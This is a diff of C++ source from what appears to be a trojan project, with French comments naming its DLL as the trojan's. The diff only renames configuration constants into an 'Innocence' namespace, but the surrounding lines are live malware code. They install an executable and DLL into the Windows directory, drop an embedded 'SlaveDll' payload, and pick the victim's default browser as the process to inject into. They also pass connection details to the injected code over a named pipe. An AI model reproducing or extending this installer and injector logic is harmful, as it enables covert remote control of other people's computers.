@@ -3,12 +3,12 @@
 #include <malicious/Injector.hpp>
 #include <malicious/BinaryRessource.hpp>
 #include <malicious/InternetExplorer.hpp>
-#include <blaspheme/Blaspheme.hpp>
+#include <Innocence.hpp>
 #include <blaspheme/protocol/ConnectionInfo.hpp>
 #include <common/Log.hpp>
 #include <network/Pipe.hpp>
 #include "Inhibiter.hpp"
-#include "ClientConfig.hpp"
+#include <Innocence.hpp>
 // DLL du trojan
 #include "SlaveDll.hpp"
 #include <shlwapi.h>
@@ -22,8 +22,8 @@ namespace Inhibiter
         current_executable_path = executable;
         System::getWindowsPath(install_directory);
 
-        executable_path = install_directory + "\\" + INHIBITER_EXE_NAME;
-        dll_path = install_directory + "\\" + INHIBITION_DLL_NAME;
+        executable_path = install_directory + "\\" + Innocence::INHIBITER_EXE_NAME;
+        dll_path = install_directory + "\\" + Innocence::INHIBITION_DLL_NAME;
     }
 
     void InhibiterCore::install()
@@ -86,13 +86,13 @@ namespace Inhibiter
         FUNC_LOG(__FUNCTION__);
         Sleep(1000);
         Malicious::BinaryRessource substrate(SlaveDll, sizeof(SlaveDll), dll_path);
-        if(INJECT_DEFAULT_BROWSER)
+        if(Innocence::INJECT_DEFAULT_BROWSER)
         {
             DWORD size = MAX_PATH;
             TCHAR buff[MAX_PATH];
             if(AssocQueryString(0, ASSOCSTR_EXECUTABLE, ".html", NULL ,buff , &size) != S_OK)
             {
-                processToInject = DEFAULT_INJECTED_PROCESS_NAME;
+                processToInject = Innocence::DEFAULT_INJECTED_PROCESS_NAME;
             }
             else
             {
@@ -101,7 +101,7 @@ namespace Inhibiter
         }
         else
         {
-            processToInject = DEFAULT_INJECTED_PROCESS_NAME;
+            processToInject = Innocence::DEFAULT_INJECTED_PROCESS_NAME;
         }
 
 		Malicious::InternetExplorer ie;
@@ -132,13 +132,13 @@ namespace Inhibiter
 			// pour ce faire, on utilise les "pipe" à la windows (IPC)
 			Network::Pipe pipe_server;
 
-			pipe_server.listen(PIPE_NAME);
+			pipe_server.listen(Innocence::PIPE_NAME);
 			LOG << "Pipe server waiting for connection";
 			if(pipe_server.accept())
 			{
-					LOG << "Sending connection informations : "+string(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+					LOG << "Sending connection informations : "+string(Innocence::blaspheme, Innocence::CONNECTION_INFO_SIZE);
 					//pipe_server.send(buffer.c_str(), buffer.size());
-					pipe_server.send(blaspheme, Blaspheme::DEFAULT_STR_SIZE);
+					pipe_server.send(Innocence::blaspheme, Innocence::CONNECTION_INFO_SIZE);
 			}
 			pipe_server.disconnect();
 		}
